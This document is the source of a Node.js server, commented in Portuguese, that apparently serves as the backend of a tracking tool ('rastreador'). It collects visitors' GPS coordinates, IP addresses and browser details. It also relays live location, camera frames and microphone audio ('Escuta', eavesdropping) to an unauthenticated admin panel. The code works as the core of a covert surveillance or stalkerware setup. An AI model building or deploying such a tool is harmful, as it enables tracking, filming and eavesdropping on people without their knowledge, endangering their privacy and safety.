const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 5e6 // Permite frames de imagem e chunks de áudio com folga
});

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Servir arquivos estáticos da pasta public
app.use(express.static(path.join(__dirname, 'public')));

// Armazenamento em memória (reseta se o servidor reiniciar)
let registros = [];

// Rota principal (Serve o index.html dentro de public)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota para o painel administrativo (Serve o rastreador.html dentro de public)
app.get('/rastreador', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'rastreador.html'));
});

// Rota da API para salvar o rastreamento
app.post('/api/track', (req, res) => {
    const { latitude, longitude, ip, userAgent, dataHora } = req.body;

    const novoRegistro = {
        id: Date.now(),
        latitude,
        longitude,
        ip: ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: userAgent || req.headers['user-agent'],
        dataHora: dataHora || new Date().toLocaleString('pt-BR')
    };

    registros.unshift(novoRegistro);
    return res.status(200).json({ success: true, message: 'Dados salvos com sucesso!' });
});

// Rota da API para o painel ler os registros
app.get('/api/registros', (req, res) => {
    return res.status(200).json(registros);
});

// Rota para limpar os registros
app.delete('/api/registros', (req, res) => {
    registros = [];
    return res.status(200).json({ success: true, message: 'Registros limpos!' });
});

// Eventos em tempo real (Localização contínua, Câmera e Escuta)
io.on('connection', (socket) => {
    const ipCliente = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    socket.on('entrar-painel', () => {
        socket.join('painel-rastreador');
    });

    socket.on('nova-sessao', (dados) => {
        io.to('painel-rastreador').emit('nova-sessao', {
            ...dados,
            ip: ipCliente
        });
    });

    socket.on('localizacao-atualizada', (dados) => {
        io.to('painel-rastreador').emit('localizacao-atualizada', {
            ...dados,
            ip: ipCliente
        });
    });

    socket.on('status-midia', (dados) => {
        io.to('painel-rastreador').emit('status-midia', {
            ...dados,
            ip: ipCliente
        });
    });

    socket.on('frame-camera', (dados) => {
        io.to('painel-rastreador').emit('frame-camera', dados);
    });

    socket.on('chunk-audio', (dados) => {
        io.to('painel-rastreador').emit('chunk-audio', dados);
    });
});

server.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});